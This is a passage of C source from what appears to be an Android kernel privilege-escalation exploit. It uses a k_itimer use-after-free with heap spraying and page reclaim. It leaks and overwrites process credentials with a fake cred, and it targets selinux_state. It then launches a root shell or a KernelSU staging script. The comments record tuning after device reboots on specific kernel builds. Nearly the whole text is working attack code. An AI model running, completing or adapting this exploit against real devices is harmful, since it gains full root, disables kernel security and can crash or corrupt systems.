	off = (size_t)((V & 0x1fff) + ITIMER_NODE);
	/* 8K 的 skb 正好覆盖 order-1 slab 的两页；但对象落在最后一格时
	 * off + cred 会越过缓冲区尾（0x1ef0+0x78+0xc0 = 0x2028 > 0x2000）。
	 * 那会写坏我们自己的堆，必须先判掉并重试。*/
	if (off + (size_t)CRED_ALLOC + 0x10 > (size_t)SOCKBUF) {
		logf("[-] plant%d off=%#zx beyond skb %d; retryable\n",
		     tag, off, SOCKBUF);
		atomic_store(&g_stop_spray, 1);
		kill(T, SIGKILL);
		waitpid(T, NULL, 0);
		res->retry = 1;
		return;
	}
	payload = malloc(SOCKBUF);
	if (!payload)
		park_forever("payload alloc failed");
	/* A is the stale node's kernel address: kernel VA, not the user alias. */
	if (mode == MODE_FAKE) {
		size_t blob = fake_blob_offset(off);

		if (blob == (size_t)-1) {
			logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
			     tag, off);
			atomic_store(&g_stop_spray, 1);
			kill(T, SIGKILL);
			waitpid(T, NULL, 0);
			free(payload);
			res->retry = 1;
			return;
		}
		build_fake_cred(payload, off, V + ITIMER_NODE, target,
				V & ~0x1fffULL, blob);
		logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
		     tag, off, blob, (unsigned long long)((V & ~0x1fffULL) + blob));
	} else {
		build_payload(payload, off, target, V + ITIMER_NODE, mode);
	}
	logf("[+] plant%d A_page_off=%#zx rb_left_slot=%#llx\n", tag, off,
	     (unsigned long long)target);

	ensure_pool();
	ensure_raw();
	atomic_store(&g_burst, 0);
	atomic_store(&g_stop_spray, 0);

	/* Create the sprayers before dropping the padding: they block on
	 * g_burst, so the first write after the release already races for the
	 * page instead of starting up during it. */
	per = g_pool_n / SPRAY_THREADS;
	for (int i = 0; i < SPRAY_THREADS; i++) {
		args[i].payload = payload;
		args[i].sock_first = i * per;
		args[i].sock_count = per;
		args[i].cpu = i;
		atomic_store(&args[i].tid, 0);
	}
	for (int i = 0; i < SPRAY_THREADS; i++)
		if (pthread_create(&th[i], NULL, spray_thread, &args[i]))
			args[i].sock_count = 0;
	for (int i = 0; i < SPRAY_THREADS; i++)
		for (int spin = 0; spin < 100000 && args[i].sock_count &&
				  !atomic_load(&args[i].tid); spin++)
			sched_yield();

	/* Empty the cache: the victim slab is now the only one that can be
	 * released, so the page really goes back to buddy. */
	trace_stop();
	delete_slab_padding(padding, padding_n);
	logf("[+] plant%d padding dropped, releasing the burst\n", tag);
	trace_start();

	/* Phase 1 starts now; phase 2 is released the moment the free is seen,
	 * so the allocation never gets a head start on us. */
	mark_stage("burst", V, slab_pfn);
	atomic_store(&g_burst, 1);
	{
		struct timespec ts;

		clock_gettime(CLOCK_MONOTONIC, &ts);
		t0 = ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
	}
	if (!g_page_armed) {
		logf("[uaf] page events not armed; skip stream wait, reclaim now\n");
	} else
	for (;;) {
		struct timespec ts;

		for (int c = 0; c < 8 && !hit && !foreign; c++) {
			long m = read_cpu(c, g_raw, g_raw_cap);
			int k = m > 0 ? parse_events(g_raw, (size_t)m, g_evs,
						     400000)
				      : 0;

			for (int j = 0; j < k; j++) {
				if (g_evs[j].type == EV_PAGE_ALLOC &&
				    g_evs[j].order <= 1 &&
				    g_evs[j].pfn == slab_pfn) {
					if (tid_is_spray_tid(g_evs[j].pid, args))
						hit = 1;
					else
						foreign = 1;
				}
				/* kmem_cache_free 在本机被 SELinux 禁掉
				 * （enable denied errno=13），页事件也没有，
				 * 唯一还能看到的信号是「我们自己的喷雾把
				 * k_itimer 分配到了受害者那一页」。*/
				if (!hit &&
				    g_evs[j].type == EV_CACHE_ALLOC &&
				    g_evs[j].ptr == V &&
				    g_evs[j].pid == etid &&
				    (TIMER_OBJ == 0 ||
				     (g_evs[j].req == TIMER_OBJ &&
				      g_evs[j].alloc == TIMER_OBJ))) {
					logf("[+] plant%d reclaim-in-page ptr=%#llx pid=%d\n",
					     tag, (unsigned long long)g_evs[j].ptr,
					     g_evs[j].pid);
					hit = 1;
				}

				if (0 && !free_seen &&
				    g_evs[j].type == EV_CACHE_FREE &&
				    (g_evs[j].ptr == V ||
				     (g_evs[j].ptr & ~0xfffULL) == (V & ~0xfffULL))) {
					/* 这台机器拿不到页事件（mm_page_alloc/free
					 * 被 SELinux 拒），但 k_itimer 释放一定会
					 * 产生 kmem_cache_free(ptr=V) —— 用它当
					 * UAF 窗口的信号，比等 pfn 更快更准。*/
					free_seen = 2;
					atomic_store(&g_burst2, 1);
				}
				if (!free_seen &&
				    (g_evs[j].type == EV_PAGE_FREE ||
				     g_evs[j].type == EV_PCPU_DRAIN) &&
				    g_evs[j].order <= 1 &&
				    (g_evs[j].pfn == slab_pfn ||
				     g_evs[j].pfn == slab_pfn + 1)) {
					free_seen = 1;
					atomic_store(&g_burst2, 1);
				}
			}
		}
		clock_gettime(CLOCK_MONOTONIC, &ts);
		if (hit || foreign || free_seen ||
		    ts.tv_sec * 1000L + ts.tv_nsec / 1000000L - t0 > 900)
			break;
		usleep(50);
	}
	atomic_store(&g_stop_spray, 1);
	atomic_store(&g_burst2, 1);
	for (int i = 0; i < SPRAY_THREADS; i++)
		if (args[i].sock_count)
			pthread_join(th[i], NULL);
	trace_stop();
	if (!fam_is_61() && !hit && !foreign && !free_seen) {
		/* 这台机器拿不到页事件、cache_free 也可能被 id 过滤掉：
		 * 再等也没有观测，直接进入写入阶段，由 cred 校验判真假。
		 * 之前在这里 return 会让每次 plant 空等 15 秒再放弃。*/
		logf("[~] plant%d UAF window unobserved; try write anyway\n", tag);
	}
	logf("[+] plant%d burst hit=%d foreign=%d free_seen=%d\n", tag, hit,
	     foreign, free_seen);
	/* 旧捷径「cache_free(V) 观测到两次就当窗口」已移除：
	 * kmem_cache_free 只证明对象还回 slab，不证明那一页回到我们手里
	 * （页可能还在 per-cpu list 或被别人拿走），据此置 hit 就是盲写活对象 ——
	 * 9.64 / 9.109 的两次重启都属于这一类。现在 hit 只能来自
	 * 「mm_page_alloc && pfn == slab_pfn && 是我们自己的喷雾线程」
	 * 或 pipe/AIO 真正拿回页（reclaim=1）。*/
	if (0 && !fam_is_61() && !hit && free_seen == 2) {
		logf("[+] plant%d cache_free window observed (victim freed)\n", tag);
		hit = 1;
	}
	/* 页级 reclaim 对所有模式都开：zero 阶段同样需要「受害者页」被
	 * 重新分给我们，而 padding 释放后该页已在 per-cpu page list 里，
	 * pipe 缓冲页是 LIFO，比插座喷雾更可能第一发就拿到。*/
	/* 零写阶段（selinux_state / panic_on_warn）不能盲写：MODE_ZERO 的真实
	 * 动作是 plant 内部对被当作 rb_node 的 target 做 rb_erase，如果那个地址
	 * 其实不是我们释放的定时器对象，就是在别人的红黑树上拆链 —— 轻则
	 * 校验不过，重则内核断言/空指针，表现为「跑完就重启」。所以必须先有
	 * 窗口证据（hit / free_seen），否则直接放弃这次 plant 并重试。*/
	if (!hit) {
		logf("[~] plant%d no page window (hit=0); skip write\n", tag);
		free(payload);
		g_held++;
		res->retry = 1;
		return;
	}

	/* gaaa 策略：stream（页级 pfn）没等到就直接 reclaim，不依赖 free_seen。
	 * 拿回受害者那一页即视为窗口打开，pipe 先、AIO 后。
	 * 只对 fake cred 有效：pipe 写的是「页内容」，只有伪造整块 cred 才需要；
	 * 零写阶段写 pipe 页对 selinux_state 毫无作用，还会把 hit 置 1 骗过后面的
	 * 校验，所以这里限定 MODE_FAKE。*/
	if (0 && mode == MODE_FAKE && !hit && !foreign) {
		int pw = pipe_plant(payload, off);

		if (pw > 0) {
			logf("[pipe] wrote=%d reclaim=1 off=%#zx (stream miss)\n",
			     pw, off);
			hit = 1;
		} else {
			logf("[uaf] stream miss; trying pipe reclaim fallback "
			     "(wrote=0 off=%#zx)\n", off);
		}
	}
#if EXTRACTKIT_AIO_PLANT
	if (0 && mode == MODE_FAKE && !hit && !foreign) {
		unsigned long poff = (unsigned long)(V & 0xfffULL);

		logf("[uaf] pipe miss; trying AIO reclaim fallback (pfn=%#llx)\n",
		     (unsigned long long)slab_pfn);
		if (aio_plant(payload, (size_t)off + 8, poff, slab_pfn)) {
			logf("[aio] plant-all reclaim=1 off=%#lx\n", poff);
			hit = 1;
		}
	}
#endif
	if (!hit) {
		logf("[-] plant%d %s; holding zombie\n", tag,
		     foreign ? "page was taken by another allocation"
			     : "burst missed");
		free(payload);
		g_held++;
		/* A pure burst miss means the freed page was never claimed by
		 * anyone, so the stale node is still allocated and stale. The
		 * caller may retry with a fresh victim; only a foreign claim
		 * makes the slot unpredictable. */
		if (!foreign)
			res->retry = 1;
		return;
	}

	usleep(1000);
	{
		int st = 0;

		waitpid(T, &st, 0);
		logf("[+] plant%d reaped status=%#x\n", tag, st);
	}
	res->V = V;
	res->A = V + ITIMER_NODE;
	res->slab_pfn = slab_pfn;
	res->ok = 1;
	free(payload);
}

static int run_daemon_stage(void)
{
	char *const av[] = { (char *)SU_PATH, (char *)"--daemon", NULL };
	char *const ep[] = { (char *)"PATH=/system/bin:/system/xbin", NULL };

	return (int)execve(SU_PATH, av, ep);
}

static int wait_child_main(int shell_mode)
{
	struct child_report rep;
	char ch;
	int hello = CHILD_HELLO;

	pin(g_cpu);
	logf("[mgr] child package=%s\n", g_mgr_pkg);
	if (shell_mode == 5) {
		logf("[mgr] probe ok pkg=%s env=%s\n", g_mgr_pkg, g_mgr_env);
		return 0;
	}
	if (write(4, &hello, sizeof(hello)) != sizeof(hello)) {
		logf("[child] hello write failed errno=%d\n", errno);
		_exit(130);
	}
	if (read(3, &ch, 1) != 1) {
		logf("[child] wake read failed errno=%d\n", errno);
		_exit(131);
	}
	close(3);

	memset(&rep, 0, sizeof(rep));
	rep.magic = CHILD_MAGIC;
	rep.uid = (int)syscall(SYS_getuid);
	rep.euid = (int)syscall(SYS_geteuid);
	logf("[child] woke uid=%d euid=%d pid=%d tgid=%d\n", rep.uid,
	     rep.euid, (int)syscall(SYS_getpid), (int)syscall(SYS_gettid));
	if (shell_mode == 4) {
		/* Fake cred: euid is 0 and all capabilities are present, but uid
		 * may still be non-zero. Hand off to ksud late-load exactly like
		 * the reference exploit. */
		char *const envp[] = {
			(char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
			(char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
			(char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
			g_mgr_env,   /* 让 ksu_stage.sh 知道该给哪个管理器注册 */
			NULL
		};
		pid_t w;
		int st = 0;

		errno = 0;
		/* No setresuid(): it rebuilds the credential through the fake
		 * sub-objects that rb_erase dirtied. uid/euid already read 0. */
		rep.setuid_ret = 0;
		rep.setuid_errno = 0;
		rep.reuid = (int)syscall(SYS_geteuid);
		rep.ruid = (int)syscall(SYS_getuid);
		rep.rsuid = rep.ruid;
		logf("[fake] fake_cred_page=%#llx\n",
		     (unsigned long long)g_fake_A);
		logf("[fake] caps before handoff:\n");
		{
			FILE *sf = fopen("/proc/self/status", "r");
			char sl[256];

			while (sf && fgets(sl, sizeof(sl), sf))
				if (!strncmp(sl, "Cap", 3) ||
				    !strncmp(sl, "Uid:", 4))
					logf("[fake]   %s", sl);
			if (sf)
				fclose(sf);
		}
		(void)!write(4, &rep, sizeof(rep));
		close(4);
		/* uid/gid 已经是 0，但 fsuid/fsgid 还停在 2000 —— 内核判文件权限用的是
		 * fsuid，所以 /data/adb（root 0700）依然打不开，ksud 自然跑不起来。
		 * setfsuid/setfsgid 只改这两个字段，不像 setresuid 会重建整个 cred。*/
		{
			long r1 = syscall(SYS_setfsuid, 0);
			long r2 = syscall(SYS_setfsgid, 0);

			logf("[fake] setfsuid(0)=%ld setfsgid(0)=%ld errno=%d\n",
			     r1, r2, errno);
			logf("[fake] /data/adb access=%s\n",
			     access("/data/adb", R_OK | X_OK) ? "denied" : "ok");
		}
		logf("[fake] forking ksud worker (step 1)\n");
		w = fork();
		logf("[fake] fork returned %d (step 2)\n", (int)w);
		if (w == 0) {
			char *const av[] = {
				(char *)"sh",
				(char *)(g_stage_path ? g_stage_path
					 : "/data/local/tmp/ksu_stage.sh"),
				NULL
			};
			/* 子进程的输出必须落盘：主进程一退出 App 就不读管道了，
			 * 之前 ksud 那几行全丢，导致"没越狱"根本查不到原因。*/
			int lf = open("/data/local/tmp/ksu_stage.out",
				      O_WRONLY | O_CREAT | O_TRUNC, 0644);

			if (lf >= 0) {
				dup2(lf, 1);
				dup2(lf, 2);
				if (lf > 2)
					close(lf);
			}

			logf("[fake] worker execing ksu_stage.sh (step 3)\n");
			execve("/system/bin/sh", av, envp);
			logf("[fake] worker exec failed errno=%d\n", errno);
			_exit(127);
		}
		if (w > 0)
			waitpid(w, &st, 0);
		logf("[fake] worker exit=%#x\n", st);
		_exit(0);
	}
	if (rep.uid != 0) {
		rep.setuid_ret = -1;
		(void)write(4, &rep, sizeof(rep));
		close(4);
		logf("[-] child uid is not 0: the cred write did not land\n");
		_exit(3);
	}

	errno = 0;
	rep.setuid_ret = (int)syscall(SYS_setresuid, 0, 0, 0);
	rep.setuid_errno = errno;
	{
		uid_t ru = 1, eu = 1, su = 1;

		(void)getresuid(&ru, &eu, &su);
		rep.ruid = (int)ru;
		rep.reuid = (int)eu;
		rep.rsuid = (int)su;
	}
	(void)write(4, &rep, sizeof(rep));
	close(4);
	logf("[child] setresuid(0,0,0)=%d errno=%d resuid=%d/%d/%d\n",
	     rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
	if (rep.setuid_ret != 0) {
		logf("[-] setresuid failed; refusing to exec a shell\n");
		_exit(4);
	}

	switch (shell_mode) {
	case 2: {
		/* Hand this boot's root to the temporary-su daemon. */
		int rc = run_daemon_stage();

		logf("[-] daemon exec failed errno=%d\n", errno);
		_exit(rc ? 6 : 0);
	}
	case 1: {
		char *const av[] = { (char *)"sh", (char *)"-i", NULL };
		char *const envp[] = { (char *)"PATH=/system/bin:/system/xbin",
				       NULL };

		execve("/system/bin/sh", av, envp);
		break;
	}
	default: {
		char *const av[] = { (char *)"sh", (char *)"-c",
			(char *)"id; cat /proc/self/attr/current "
				"2>/dev/null; echo ROOT_SHELL_OK", NULL };
		char *const envp[] = { (char *)"PATH=/system/bin:/system/xbin",
				       NULL };

		execve("/system/bin/sh", av, envp);
		break;
	}
	}
	logf("[-] shell exec failed errno=%d\n", errno);
	_exit(5);
}

/* The child execs this binary so it owns a private real cred. That exec
 * allocates cred_jar (bytes_req 0xb8/bytes_alloc 0xc0); we leak its address
 * and keep the child blocked on fd 3 until the write has landed. */
static uint64_t g_child_task;
static int g_fake_stage;

static uint64_t leak_cred(pid_t *out_pid, int *out_go, int *out_st,
			  int shell_mode)
{
	for (int attempt = 0; attempt < 4; attempt++) {
		int go[2], st[2];
		pid_t p;
		long n;
		int c, hello = 0;
		uint64_t R = 0, site = 0;

		if (pipe(go) || pipe(st))
			return 0;
		/* Start tracing before the fork so the child's task_struct
		 * allocation (copy_process) is captured, not just its creds. */
		trace_start();
		p = fork();
		if (p == 0) {
			int g2, s2;
			char ch;

			close(go[1]);
			close(st[0]);
			g2 = fcntl(go[0], F_DUPFD, 20);
			s2 = fcntl(st[1], F_DUPFD, 20);
			if (g2 < 0 || s2 < 0)
				_exit(125);
			close(go[0]);
			close(st[1]);
			dup2(g2, 3);
			dup2(s2, 4);
			close(g2);
			close(s2);
			pin(g_cpu);
			if (read(3, &ch, 1) != 1)
				_exit(126);
			{
				char *const av[] = {
					(char *)"/proc/self/exe",
					(char *)"wait",
					(char *)(shell_mode == 3	? "caps"
						 : shell_mode == 2 ? "daemon"
						 : shell_mode == 1 ? "shell"
						 : g_fake_stage	   ? "fake"
								   : "verify"),
					NULL
				};
				char *const ep[] = {
					(char *)"PATH=/system/bin:/system/xbin",
					g_mgr_env,	/* execve 会清空环境，必须显式传 */
					NULL
				};

				execve("/proc/self/exe", av, ep);
			}
			_exit(127);
		}
		if (p < 0) {
			close(go[0]);
			close(go[1]);
			close(st[0]);
			close(st[1]);
			return 0;
		}
		close(go[0]);
		close(st[1]);
		if (write(go[1], "A", 1) != 1)
			logf("[!] cred wake write failed\n");
		usleep(80000);
		trace_stop();
		n = read_all_cpus(g_raw, g_raw_cap);
		c = n > 0 ? parse_events(g_raw, (size_t)n, g_evs, 400000) : 0;
		{
			int nmatch = 0;
			int cpass;
			int allcache = 0;   /* 本批记录里 cache 分配的总条数 */
			int forpid = 0;     /* 其中 pid 属于子进程的条数 */

			/* 两遍扫同一个缓冲区：第一遍按站点严格匹配；一条都没中就说明
			 * 这颗内核的 cred 站点常量对不上，第二遍只按尺寸类匹配。
			 * 不再另起子进程，也不再让「站点不对」直接判死。*/
			for (cpass = 0; cpass < 3 && !R; cpass++) {
				/* cpass 0: 严格站点 + 只认子进程 pid
				 * cpass 1: 站点放宽（只按尺寸）
				 * cpass 2: pid 也放宽（fork 里的 copy_creds 记在父进程头上）*/
				int soft = g_site_soft || cpass >= 1;
				int selfpid = (int)getpid();
				unsigned hist[6][2];
				int hn = 0;
				int shown = 0;

				for (int i = 0; i < c; i++) {
					if (g_evs[i].type != EV_CACHE_ALLOC)
						continue;
					if (cpass == 0)
						allcache++;
					if (g_evs[i].pid != (int)p &&
					    !(cpass >= 2 && g_evs[i].pid == selfpid))
						continue;
					if (cpass == 0)
						forpid++;
					if (hn < 6 && g_evs[i].req) {
						int k, dup = 0;

						for (k = 0; k < hn; k++)
							if (hist[k][0] == (unsigned)g_evs[i].req &&
							    hist[k][1] == (unsigned)g_evs[i].alloc)
								dup = 1;
						if (!dup) {
							hist[hn][0] = (unsigned)g_evs[i].req;
							hist[hn][1] = (unsigned)g_evs[i].alloc;
							hn++;
						}
					}
					/* cred 的 kmem_cache 对象大小会因内核/编译选项
					 * 在 0xa8~0xd0 之间浮动（本机实测 0xc8，cfg
					 * 里写的是 0xb8），死比相等会一条都匹配不到。
					 * 放宽成 ±0x18 的窗口，靠后面的四段 uid 校验兜底。*/
					{
						unsigned rq = (unsigned)g_evs[i].req;
						unsigned al = (unsigned)g_evs[i].alloc;
						unsigned lo = (unsigned)CRED_REQ > 0x10
								      ? (unsigned)CRED_REQ - 0x10
								      : 0;
						unsigned hi = (unsigned)CRED_ALLOC + 0x10;

						/* SLUB 里 bytes_req 是 object_size、bytes_alloc 是对齐后
						 * 的 slab 尺寸，两者本来就常常差 0x10（cred: 0xb0 vs
						 * 0xc0）。原来要求 rq == al 等于把真实 cred 记录全部
						 * 丢掉；这里只要求 al >= rq，并把区间限定在
						 * [CRED_REQ-0x10, CRED_ALLOC+0x10]。*/
						if (!rq || al < rq || rq < lo || rq > hi)
							continue;
						/* 精确尺寸的匹配优先：先记下，遍历完如果没有任何
						 * 精确命中，再用最后一条宽松命中兜底。*/
						if (rq == (unsigned)CRED_REQ) {
							g_cred_exact = g_evs[i].ptr;
							g_cred_exact_site = g_evs[i].site;
						}
					}
					if (!LOW21_EQ((g_evs[i].site & 0x1fffff), CRED_SITE_LOW21)) {
						if (!soft)
							continue;
						if (!g_site_fallback_logged) {
							g_site_fallback_logged = 1;
							logf("[!] cred site %#llx != %#llx; soft match 0x%llx/0x%llx\n",
							     (unsigned long long)(g_evs[i].site & 0x1fffff),
							     (unsigned long long)CRED_SITE_LOW21,
							     (unsigned long long)CRED_REQ,
							     (unsigned long long)CRED_ALLOC);
						}
					}
					nmatch++;
					if (++shown <= 3)
						logf("[cred]   match#%d ptr=%#llx site_low=%#llx\n",
						     nmatch, (unsigned long long)g_evs[i].ptr,
						     (unsigned long long)(g_evs[i].site & 0x1fffff));
					/* 有效 cred 是 commit_creds() 装上去的那一个，
					 * 也就是 exec 完成前 prepare_exec_creds() 的最后一次分配，
					 * 所以持续覆盖，最后一个胜出。*/
					R = g_evs[i].ptr;
					site = g_evs[i].site;
					g_cred_loose = R;
					g_cred_loose_site = site;
				}
				if (cpass == 1 && !R && c > 0) {
					int k;

					logf("[cred] sizes(%d):", hn);
					for (k = 0; k < hn; k++)
						logf(" %#x/%#x", hist[k][0], hist[k][1]);
					logf("[!] cred site strict=0; rescan by size\n");
					g_site_soft = 1;
				}
			}
			if (!R && g_cred_loose) {
				/* 只有宽松命中：用它，但打日志说明尺寸不是标准值。*/
				R = g_cred_loose;
				site = g_cred_loose_site;
				logf("[cred] only loose-size match, using %#llx\n",
				     (unsigned long long)R);
			}
			if (g_cred_exact) {
				R = g_cred_exact;
				site = g_cred_exact_site;
				logf("[cred] exact-size hit preferred: %#llx\n",
				     (unsigned long long)R);
			}
			logf("[cred] attempt=%d child=%d cacheAllocs=%d forPid=%d matches=%d\n",
			     attempt, p, allcache, forpid, nmatch);
			{
				/* 诊断：期望的 cred call_site 在整批记录里到底出现过没有。
				 * total>0 && childPid==0 → 事件有、是我们的 pid/尺寸过滤把它丢了；
				 * total==0              → 这个内核根本没给我们这条事件（变体未武装）。*/
				int sh_total = 0, sh_pid = 0, k, shown2 = 0;

				for (k = 0; k < c; k++) {
					if (!LOW21_EQ((g_evs[k].site & 0x1fffff), CRED_SITE_LOW21))
						continue;
					sh_total++;
					if (g_evs[k].pid == (int)p)
						sh_pid++;
					if (shown2 < 3) {
						logf("[cred]   hit#%d type=%d req=%#llx alloc=%#llx pid=%d self=%d ptr=%#llx\n",
						     ++shown2, (int)g_evs[k].type,
						     (unsigned long long)g_evs[k].req,
						     (unsigned long long)g_evs[k].alloc,
						     g_evs[k].pid, (int)getpid(),
						     (unsigned long long)g_evs[k].ptr);
					}
				}
				logf("[cred] site-hit %#llx: total=%d childPid=%d\n",
				     (unsigned long long)CRED_SITE_LOW21, sh_total, sh_pid);
			}
			if (allcache && !forpid)
				logf("[!] no record for child pid\n");
		}
		if (!R && fam_is_61()) {
			logf("[selftest] no cred alloc at call_site=%#llx -- "
			     "constants suspect, refusing to run\n",
			     (unsigned long long)CRED_SITE_LOW21);
			park_forever("CHAIN_STOP:selftest");
		}
		if (R) {
			struct pollfd pf = { .fd = st[0], .events = POLLIN };

			if (poll(&pf, 1, 2000) > 0 &&
			    read(st[0], &hello, sizeof(hello)) ==
				    sizeof(hello) &&
			    hello == CHILD_HELLO) {
				/* copy_process runs in our context, so the record
				 * carries our pid but the pointer is the child's
				 * task_struct. */
				g_child_task = scan_task_allocs(g_evs, c, getpid());
				logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx recs=%d task=%#llx\n",
				     attempt, p, (unsigned long long)R,
				     (unsigned long long)(site & 0x1fffff), c,
				     (unsigned long long)g_child_task);
				*out_pid = p;
				*out_go = go[1];
				*out_st = st[0];
				return R;
			}
		}
		logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d failed\n",
		     attempt, p, (unsigned long long)R, hello, c);
		close(go[1]);
		close(st[0]);
		kill(p, SIGKILL);
		waitpid(p, NULL, 0);
	}
	return 0;
}

/* 9.206：把「装假 cred + 同步 real_cred」收成一处。原来这段在 main 里
 * 出现两遍（首次安装、pass>1 重喷），第二份缩进错乱且容易和 pass 循环
 * 的变量混在一起，清理成单一入口，语义保持不变。 */
static int fake_cred_install(struct plant_res *out)
{
	memset(out, 0, sizeof(*out));
	if (stage_write(g_child_task + OFF_TASK_CRED, MODE_FAKE, "fake_cred",
			out))
		return -1;
	/* 判据源修正：task_struct 里 cred 与 real_cred 相邻（real_cred
	 * 在前 8 字节）。/proc/<pid>/status 的 Uid 由 __task_cred() 取
	 * real_cred 生成，访问检查也走 real_cred —— 只改 cred 时判据
	 * 永远看不到变化。两个都装上（BTF 的 cred 偏移 ≥ 0x800 时）。 */
	if (OFF_TASK_CRED >= 0x800) {
		struct plant_res rc;

		memset(&rc, 0, sizeof(rc));
		if (stage_write(g_child_task + OFF_TASK_CRED - 8, MODE_FAKE,
				"real_cred", &rc))
			logf("[!] task->real_cred miss (continue)\n");
		else
			logf("[+] task->real_cred installed A=%#llx\n",
			     (unsigned long long)rc.A);
	}
	return 0;
}

int main(int argc, char **argv)
{
	{
		const char *se = getenv("EXTRACTKIT_SLIDE");
		if (se && se[0])
			g_slide_env = strtoull(se, NULL, 16);
#if EXTRACTKIT_SCHED_SLIDE
		if (!g_slide_env) {
			uint64_t ss = 0;
			if (sched_slide_leak(&ss)) {
				g_slide_env = ss;
				logf("[+] slide sched=%#llx\n",
				     (unsigned long long)ss);
			}
		}
#endif
	}
	int shell_mode = 0, leak_only = 0, check_only = 0, selftest = 0;
	int pointer_mode = MODE_ZERO;
	int fake_stage = 0;
	pid_t C = -1;
	int go_fd = -1, st_fd = -1;
	uint64_t R;
	struct plant_res r;

	setvbuf(stdout, NULL, _IONBF, 0);

	/* 「一位内核一份 payload」的防篡位闸门：这份二进制只认编译时指定的
	   那一个内核 build。跑在别的内核上时所有常量（结构偏移、call site、
	   锚点地址）都不成立，继续跑就会写到错误对象上，所以直接拒绝。
	   留空表示通用构建（例如 offsets-only 版），不做这项检查。 */
	if (EXPECT_FAMILY[0]) {
		char kb[256];
		int fd = open("/proc/sys/kernel/osrelease", O_RDONLY);
		int n = fd >= 0 ? (int)read(fd, kb, sizeof(kb) - 1) : -1;
		size_t fl = strlen(EXPECT_FAMILY);
		if (fd >= 0)
			close(fd);
		if (n > 0) {
			while (n > 0 && (kb[n - 1] == '\n' || kb[n - 1] == '\r'))
				n--;
			kb[n] = 0;
			if (strncmp(kb, EXPECT_FAMILY, fl)) {
				logf("[guard] built for %s*, running %s; refuse\n",
				     EXPECT_FAMILY, kb);
				return 3;
			}
			logf("[guard] kernel family matches payload (%s* <- %s)\n",
			     EXPECT_FAMILY, kb);
		}
	}
	if (EXPECT_KERNEL[0]) {
		char kb[256];
		int fd = open("/proc/sys/kernel/osrelease", O_RDONLY);
		int n = fd >= 0 ? (int)read(fd, kb, sizeof(kb) - 1) : -1;
		if (fd >= 0)
			close(fd);
		if (n > 0) {
			while (n > 0 && (kb[n - 1] == '\n' || kb[n - 1] == '\r'))
				n--;
			kb[n] = 0;
			if (strcmp(kb, EXPECT_KERNEL)) {
				logf("[guard] built for %s, running %s; refuse\n",
				     EXPECT_KERNEL, kb);
				return 3;
			}
			logf("[guard] kernel build matches payload (%s)\n", kb);
		}
	}

	/* 必须在 "wait" 分支之前：子进程 execve 回来时走的就是那条路，
	   解析晚了 g_mgr_pkg 会停在默认的 com.sukisu.ultra。 */
	mgr_sanitize(getenv("EXTRACTKIT_MGR"));

	/* 自检：完全照抄凭据子进程的 execve 方式（清空环境 + ep[] 只带
	   PATH 和包名），验证重执行后 g_mgr_pkg 还是调用方指定的那个。
	   不碰内核、不写 cred，跑一秒就完，用来验收「包名真的送到了」。 */
	if (argc > 1 && !strcmp(argv[1], "mgrprobe")) {
		char *const av[] = { (char *)"/proc/self/exe", (char *)"wait",
				     (char *)"mgrprobe", NULL };
		char *const ep[] = {
			(char *)"PATH=/system/bin:/system/xbin", g_mgr_env, NULL
		};

		logf("[mgr] probe parent package=%s env=%s\n", g_mgr_pkg,
		     g_mgr_env);
		execve("/proc/self/exe", av, ep);
		logf("[mgr] probe execve failed errno=%d\n", errno);
		return 127;
	}

	if (argc > 1 && !strcmp(argv[1], "wait")) {
		int mode = 0;

		if (argc > 2 && !strcmp(argv[2], "shell"))
			mode = 1;
		else if (argc > 2 && !strcmp(argv[2], "daemon"))
			mode = 2;
		else if (argc > 2 && !strcmp(argv[2], "caps"))
			mode = 3;
		else if (argc > 2 && !strcmp(argv[2], "fake"))
			mode = 4;
		else if (argc > 2 && !strcmp(argv[2], "mgrprobe"))
			mode = 5;
		return wait_child_main(mode);
	}

	if (argc > 1 && !strcmp(argv[1], "shell"))
		shell_mode = 1;
	if (argc > 1 && !strcmp(argv[1], "daemon"))
		shell_mode = 2;
	if (argc > 1 && !strcmp(argv[1], "leak"))
		leak_only = 1;
	if (argc > 1 && !strcmp(argv[1], "check"))
		check_only = 1;
	if (argc > 1 && !strcmp(argv[1], "selftest"))
		selftest = 1;
	/* "fake": YuKongA's fake-cred + KernelSU late-load chain. */
	if (argc > 1 && !strcmp(argv[1], "fake")) {
		fake_stage = 1;
		g_fake_stage = 1;
	}
	g_cpu = 0;
	g_ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (g_ncpu < 1 || g_ncpu > 32)
		g_ncpu = 1;
	if (argc > 2 && !strcmp(argv[1], "cpu"))
		g_cpu = atoi(argv[2]);

	g_raw_cap = 48u << 20;
	g_raw = malloc(g_raw_cap);
	g_evs = malloc(sizeof(*g_evs) * 400000);
	if (!g_raw || !g_evs) {
		logf("[-] alloc failed\n");
		return 1;
	}

	g_stage_path = getenv("EXTRACTKIT_STAGE");
	logf("[mgr] manager package=%s\n", g_mgr_pkg);
	{
		const char *soft = getenv("EXTRACTKIT_SOFT_SITE");

		if (soft && soft[0] == '1')
			g_site_soft = 1;
	}
	if (load_device_cfg()) {
		logf("[payload] family=%s\n", EXTRACTKIT_FAMILY_ID);
		logf("[cfg] loaded local profile: timer=%#llx selinux=%#llx task_cred=%#llx cred_uid=%#llx\n",
		     (unsigned long long)STATIC_TIMER_SITE,
		     (unsigned long long)SELINUX_STATE_STATIC,
		     (unsigned long long)OFF_TASK_CRED,
		     (unsigned long long)CRED_UID_OFF);
	} else {
		logf("[cfg] using compile-time defaults (no device.cfg)\n");
	}
	/* 双模：有 text 符号就按有的跑；没有就自动降级成 offsets-only。
	 * 降级条件是 STATIC_TIMER_SITE/TIMER_SITE_LOW21 缺失（cfg 里为 0），
	 * 因为只有这两项是「必须从内核 text 拿」的，其余都能用结构偏移 + 尺寸类替代。*/
#ifdef FORCE_OFFSETS_ONLY
	/* 编译期指定：完全不依赖内核 text（不解析 call_site、不校准 base），
	 * 只按结构偏移 + 尺寸类作业。给事件布局与 6.x 不同的内核（如 5.10）用。 */
	g_offsets_only = 1;
#endif
